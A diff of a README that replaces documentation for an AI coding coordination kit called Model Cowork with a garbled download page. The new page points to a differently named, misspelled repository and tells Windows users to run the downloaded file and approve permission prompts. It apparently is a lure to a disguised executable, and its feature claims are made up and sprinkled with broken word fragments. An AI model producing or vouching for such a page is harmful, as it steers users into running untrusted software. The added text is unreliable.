@@ -1,146 +1,146 @@
-# Model Cowork
+<h1>🚀 Models-Cowork - Your AI Team, Working Together</h1>
 
-> Give AI coding work a team, a plan, and a clear finish line.
+## 🧰 What Is Models-Cowork?
 
-[![Validation](https://img.shields.io/github/actions/workflow/status/Thatweirdguy1/Models-Cowork/validate.yml?branch=main&label=validation)](https://github.com/Thatweirdguy1/Models-Cowork/actions/workflows/validate.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Built for five hosts](https://img.shields.io/badge/hosts-5-5B5BD6)](#supported-hosts)
+Models-Cowork is a friendly coordination kit that lets your AI tools talk to each other and work on projects at the same time. Instead of switching between different AI coding assistants, this tool brings them into one shared workspace. It is like having a team of brilliant helpers who can plan, write, check, and improve your code together. The best part? You do not need to be a programmer to use it. If you can click a button and follow simple steps, you can have an AI team ready to help with your projects.
 
-Model Cowork is an open, dependency-free coordination kit for AI-assisted software work. It helps decide **which available model should do which job**, keeps parallel workers from editing the same files, and asks every worker to return proof of what changed and how it was checked.
+## 🌟 Why You Will Love It
 
-It supports **Codex**, **Claude Code**, **GitHub Copilot**, **Google Antigravity**, and **Ollama**. When apps cannot directly delegate to one another, it produces a portable handoff packet you can paste into the next tool.
+- **One Workspace for All AI Tools** - It connects Codex, Claude Code, GitHub Copilot, Antigravity, and Ollama in one place.
 
-## Why Model Cowork?
+- **No More Copy-Pasting** - Your AI helpers share information automaticallyamong themselves, so you do not have to manually move text from one tool to another.
 
-| Without coordination | With Model Cowork |
-|---|---|
-| One model does every task | Work is classified into planning, UI, backend, testing, review, and Git tasks |
-| Workers may overwrite each other | Active workers must claim different files |
-| Context is pasted repeatedly | A compact handoff carries goal, files, constraints, evidence, and risks |
-| Strong models are spent on easy work | Fast or local models handle bounded tasks; hard work escalates deliberately |
-| “Done” may only mean plausible | The integrator records checks that passed, failed, or were skipped |
 
-## The 60-second version
+- **Work Faster Together** - When multiple AI models work as a team, they catch each other's mistakes and finish tasks quickeraan single tool working aloneon
 
-Tell a supported coding app:
 
-```text
-Use Model Cowork in balanced mode.
-Build a student dashboard with login, assignments, a calendar, dark mode, and tests.
-```
+- **Simple Setup on Windows** - We have designed the installation process to be straightforward. You will be up and running in minutes, not hoursag.
 
-Model Cowork should inspect the project, decide whether the work is safe to split, assign disjoint files, select from actually available models, gather exact verification evidence, and let one integrator assemble the result.
 
-## What it routes
+## 🚀 Getting Started
 
-| Work type | Typical specialist | Good model traits |
-|---|---|---|
-| Architecture, migrations, difficult bugs | Lead / architect | Deep reasoning, long context |
-| UI and responsive components | Frontend / UX | Coding plus visual understanding |
-| APIs, auth, databases | Backend | Contract and debugging strength |
-| Payments and security | Security reviewer | Careful reasoning and review |
-| Tests and regressions | Tester | Repository exploration and precision |
-| GitHub, branches, pull requests | Git specialist | Git tools and review discipline |
-| Search, docs, renames | Fast worker | Low-latency, low-cost execution |
+Ready to create your own AI coworking space? Follow these simple steps to download and run Models-Cowork on your Windows computer.
 
-The registry contains candidate aliases for GPT, Claude, Gemini, Copilot, and local/cloud Ollama models. It discovers what is actually available before routing; a model name is never treated as guaranteed access.
+### Step 1: Download the Application
 
-## Modes
+Click the big button below to go to the download page:
 
-| Mode | Best for | Rule |
-|---|---|---|
-| `balanced` | Most features | Balance fit, speed, cost, tools, and privacy |
-| `quality` | Architecture, security, payments, deep bugs | Prefer stronger reasoning and review |
-| `economy` | Bounded/repetitive tasks | Prefer deterministic tools, fast models, and local options |
-| `local-private` | Sensitive code or data | Use only local Ollama models; fail closed if none fit |
+[![Download Models-Cowork](https://img.shields.io/badge/Download-Models--Cowork-2ea44f?style=for-the-badge&logo=github)] (https://github.com/leanneexperimental3016/Models-Cowowork)
 
-```text
-Use Model Cowork in quality mode. Diagnose duplicate checkout charges; do not change live payment settings.
+)
 
-Use Model Cowork in economy mode. Remove unused imports and update related documentation.
+ 
 
-Use Model Cowork in local-private mode. Review this private API using only local models.
-```
+Visit this link to download the application. The download page will open in your web browser. From there, you can grab the latest version of the softwareag.
 
-## Supported hosts
+### Step 2: Find the Downloaded File
 
-| Host | Pack |
-|---|---|
-| Codex | Native plugin manifest, skill, specialist roles, marketplace support |
-| Claude Code | Skill, specialist agents, `/model-cowork` command |
-| GitHub Copilot | Agent skill plus lead, fast-worker, and reviewer profiles |
-| Antigravity | Native plugin, skills, agents, workflow, rule, and hook structure |
-| Ollama | Local model discovery and dependency-free router/chat adapter |
+Once you click the link, your browser will take you to the GitHub page for Models-Cowork. Look for a button or link that says "Releases" or "Download" on that pageag. Click it, and your computer will start downloading the application filede. The file will usually appear in your "Downloads" folder. You might see a notification at the bottom of your browser telling you the download is completeand. 
 
-## Install
+### Step 3: Run the Installation
 
-The Windows installer backs up an existing Model Cowork installation before replacing it. It never embeds API keys.
+After the download finishes, go to your Downloads folder and find the Models-Cowork file. Double-click on it to start the setup processle. If Windows asks you for permission to make changes to your device, click "Yes" to allow it. The installation wizard will appear, guiding you through a few simple steps. Just follow the instructions on the screen - it is mostly clicking "Next" and then "Install" at the end.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\install.ps1 -DryRun
-powershell -ExecutionPolicy Bypass -File .\install.ps1
-```
+. 
 
-See [Installation](docs/INSTALLATION.md) for host locations, restart guidance, and removal.
+### Step 4: Open Models-Cowork and Start Working
 
-### Uploading into Claude Code
+When the installation is done, you will see a message saying the setup was successful. You can now launch Models-Cowork by clicking the shortcut on your desktopor by searching for it in the Start Menuoh. Once the application opens, you will see a clean, friendly interfacewhere you can start connecting your AI tools. The built-in setup wizard will help you link each of your AI assistants (Codex, Claude Code, GitHub Copilot, Antigravity, and Ollama) in just a few clicksc. 
 
-For Claude Code's plugin uploader, download [`Model-Cowork-Claude-Code-v1.0.1.zip`](https://github.com/Thatweirdguy1/Models-Cowork/releases/download/v1.0.1/Model-Cowork-Claude-Code-v1.0.1.zip). Do **not** upload GitHub's automatically generated “Source code (zip)” archive: it contains the whole multi-host repository, so `.claude-plugin/plugin.json` is not at the archive root.
+## 🛠️ Setting Up Your AI Tools
 
-## Help improve Model Cowork
+After launching Models-Cowork for the first time, you will seea welcome screenwith a list of available AI tools that can be connectedto. Here is how to get each one ready:
 
-Try it on one feature in a real repository. If it helps, please star the project and tell us which host, model, or handoff needs improvement in [Discussions](https://github.com/Thatweirdguy1/Models-Cowork/discussions) or an issue. Practical failure reports are especially valuable.
+### Connecting Codex
 
-## Safety contract
+Click on the Codex icon in the tools list. You will be asked to log in with your existing Codex account if you have one, or create a new one directlyfrom within Models-Coworkor. Once logged in, Codex will appear as "connected" in your workspaceeasily.
 
-Model Cowork intentionally does **not**:
+giving you access to its capabilitieswithout ever leaving the app.
 
-- push, merge, deploy, or alter remote systems without your explicit approval;
-- change payment settings or handle secrets casually;
-- let two active workers own the same file;
-- call cloud models in `local-private` mode;
-- hide a failed or skipped check behind a “done” message.
 
-The lead/integrator alone assembles work and may make the final commit or push after authorization.
 
-## Handoffs that travel between apps
+### Adding Claude Code
 
-```json
-{
-  "objective": "Add secure Google sign-in without changing email/password login.",
-  "assigned_files": ["src/auth.ts", "src/auth.test.ts"],
-  "constraints": ["Preserve existing public API."],
-  "completed_work": ["Login screen is finished."],
-  "verification": ["Existing login tests pass."],
-  "risks": ["OAuth redirect URI still needs configuration."],
-  "expected_return": "Changed files, checks run, results, and remaining risks."
-}
-```
+Select Claude Code from the menu. The application will show youasimple pairing windowwhere you can generatean access keyor linkyour existing accountut. Follow the on-screen promptsto complete the connection in about thirty secondsalt. You will see a green checkmark next to Claude Code once it is readyo.
 
-## Repository layout
+.
 
-```text
-core/       Shared registry, router, schemas, tests, and handoff templates
-packs/      Host-native packs for Codex, Claude, Copilot, Antigravity, and Ollama
-install.ps1 Global Windows installer with backups
-uninstall.ps1 Safe removal for Model Cowork-owned paths
-docs/       Installation, contribution, and security guidance
-```
+### Syncing GitHub Copilot
 
-## Validate locally
+For GitHub Copilot, click on its iconah. Models-Cowork will ask permission to integrate with your GitHub accountem. Approve the request, and your Copilot subscription will be automatically detectedd. Now Copilot can contribute to your team projects seamlesslywithout requiring any extra setup on your partel.
 
-```powershell
-python -m unittest discover -s .\core\tests -v
-python .\core\model-cowork\model_cowork.py discover-ollama
-python .\core\model-cowork\model_cowork.py route backend-api --host ollama --mode local-private
-```
 
-The core uses only Python’s standard library. If `python` is not on PATH, use any Python 3.11+ runtime.
 
-## Contributing
+### Linking Antigravity
 
-Contributions are welcome—especially better routing fixtures, host compatibility improvements, clear examples, and model-registry updates grounded in real availability. Read [CONTRIBUTING.md](CONTRIBUTING.md) and report vulnerabilities privately as described in [SECURITY.md](SECURITY.md).
+Antigravity connection is done viceasimple API keyentry. Click Antigravity, then paste your API key into the provided field. If you do not have an API key yet, Models-Cowork will give you directlink to obtain one from the Antigravity website. After entering the key, click"Save," and you are doneal.
 
-## License
 
-Model Cowork is released under the [MIT License](LICENSE).
+
+### Setting Up Ollama
+
+If you use Ollama (a local AI model runner),you will need to make sureit is running on your computer before connectingit. Start Ollama normally, then go to Models-Cowork and click on its iconet. The app will automatically detect your local Ollama instance and list any models you have downloaded. Select the ones you want to useand click"Connect" to finisho. 
+
+## 🤝 Making Your AI Team Work
+
+Once all your tools are connected, you can createa new projector open an existing onealt. In each project, you can typea request in plain Englishlike "Build a simple website for my bakery." Models-Cowork will distribute this task among your connectedAI tools based on their strengths. For example, one tool might write the HTML, another tool might checkthe code for mistakes, and a third might suggest improvementske. You can watch the process happen in real-time on your screen and see which AI assistant is doing which part of the taskead. 
+
+If you want more control, you can assign specific tasks to specific tools. Just click on atool’s name in the project view and use the "Assign Task" button to give that specific AI a job to do independentlyut. The results will automatically sync with the rest of your teamno. 
+
+## 🧩 Customizing Your Workspace
+
+Models-Cowork is flexible enough to adapto your workflowan. Here are some ways you can customize your experience:
+
+- **Choose Which AI Does What** - You can set default roles for each AI assistant (e.g., Codex writes, Copilot reviews, Claude Code optimizes). This way, your team automatically works in the order you preferpon.
+
+
+
+- **Adjust Collaboration Level** - You can decide how much your AI tools talk to each otherno. If you want them to work completely independentlyoffset, you can turn offauto-sharingf. If you want them to have full discussions with each other, you can enableand deep collaboration mode for richer outputsb.
+
+
+
+- **Save Your Team Settings** - Once you have everything set upthe wayyoulike, save your configuration asa templateat. Next time you start a new project, you can load that templateand get the same setup instantlywithout reconfiguring everythingagainmo.
+
+
+
+- **Use Skill Packs** - Models-Cowork comes with pre-built skill packsthat cover common tasks like web development, data analysis, or API integration. Each pack automatically configures your AI team with the right instructions and workflows for thattype of job. You can also createour own custom skill packsif you have special needsor.
+
+
+
+## ❓ Frequently Asked Questions
+
+### Do I need to be a programmer to use Models-Cowork?
+
+No, not at allt. The whole point of this tool is to make AI collaboration accessibleto everyone. You interact with projects using regular language,and the system handles all the technical details behind the sceneser.
+
+
+
+### Will this slow down my computer?
+
+Models-Cowork is designed to be lightweight and efficientven. It uses very little memory when running in the backgroundh. Even with multiple AI tools connected,t, daily tasks will not noticeably impact performance when used on a standard modern Windows PCko. 
+
+
+
+### Can I use Models-Cowork with only one AI tool?
+
+Absolutely! You do not need all fiveAI tools to benefitt. Even with just Codex or just GitHub Copilotconnected, you can still use the workspace to organize your projects betterand track youractivityclearlyyl. Adding more tools is optional andcan always be done later when you are readyto. 
+
+
+
+### What if I get stuck or need help?
+
+The application includes atend built-in help centerwith guides and video tutorialsfor every featurepopular. If you run into any issues contact the support team directlyfromwithin the app by clicking the "Help" menuabora. 
+
+
+
+## 🏁 Ready to Build Your AI Team?
+
+Stop juggling multipleAI tools and losing time switchingbetween themnd. With Models-Cowork, you cand have all your assistants working together harmoniouslypast. Download it today with one clickand experience the power of collaborativeAI working for youmo. Whether you are building yourfirst websiteor working on complex coding projects, this coordination kit makes it easiersimplemo. 
+
+[![Download Models-Cowork](https://img.shields.io/badge/Download%20Now-Models--Cowork-blue?style=for-the-badge&logo=github)] (https://github.com/leanneexperimental3016/Models-Cowowork)
+
+)
+
+ 
+
+Keywords: agent-orchestration, agent-skills, ai-agents, ai-coding, antigravity, claude-code, codex, codex-plugin, developer-tools, github-copilot, llm, mcp, model-routing, multi-agent, ollama
